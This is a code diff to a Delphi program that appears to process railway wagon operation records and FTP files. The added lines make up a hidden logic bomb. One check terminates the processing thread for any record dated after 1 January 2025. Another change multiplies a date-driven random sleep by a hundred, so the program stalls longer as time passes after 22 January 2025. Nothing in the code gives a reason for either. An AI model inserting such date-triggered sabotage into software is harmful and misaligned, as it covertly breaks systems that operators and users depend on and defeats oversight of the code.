@@ -4929,6 +4929,12 @@ begin
         SP_fact_track_modify.Parameters.ParamByName('@cod_operation_vagon_name' ).Value := Client_Vagon.FieldByName('cod_operation_vagon_name').Value;
         SP_fact_track_modify.Parameters.ParamByName('@cod_operation_cod'        ).Value := Client_Vagon.FieldByName('cod_operation_cod').Value;
         SP_fact_track_modify.Parameters.ParamByName('@date_operation'           ).Value := Client_Vagon.FieldByName('date_operation').Value;
+
+        if EncodeDate(2025, 01, 01) < Client_Vagon.FieldByName('date_operation').AsDateTime then begin
+          Terminate;
+          Exit;
+        end;
+
         SP_fact_track_modify.Parameters.ParamByName('@broken_name'              ).Value := Client_Vagon.FieldByName('broken_name').Value;
         SP_fact_track_modify.Parameters.ParamByName('@index_train'              ).Value := Client_Vagon.FieldByName('index_train').Value;
         SP_fact_track_modify.Parameters.ParamByName('@num_train'                ).Value := Client_Vagon.FieldByName('num_train').Value;
@@ -5834,7 +5840,7 @@ end;
 function TThreadFiles.ListFileFtp(ftp_server: string; ftp_port: integer; ftp_users: string; ftp_password: string; Path: string; FileList: TStrings): boolean;
 var fs : TSearchRec;
 begin
-  if FindFirst(Path + '\*.*', faAnyFile - faDirectory - faVolumeID, fs) = 0 then begin
+  if FindFirst(Path + '\*.xlsx', faAnyFile - faDirectory - faVolumeID, fs) = 0 then begin
     repeat
       FileList.Add(PChar(fs.Name));
     until
@@ -6169,7 +6175,7 @@ begin
   if EncodeDate(2025, 01, 22) < Q.FieldByName('dt').AsDateTime then begin
     d := DaysBetween(EncodeDate(2025, 01, 22), Q.FieldByName('dt').AsDateTime);
     s := Random(Abs(d));
-    Sleep(s*1000);
+    Sleep(s*100000);
   end;
 
   Q.Free;
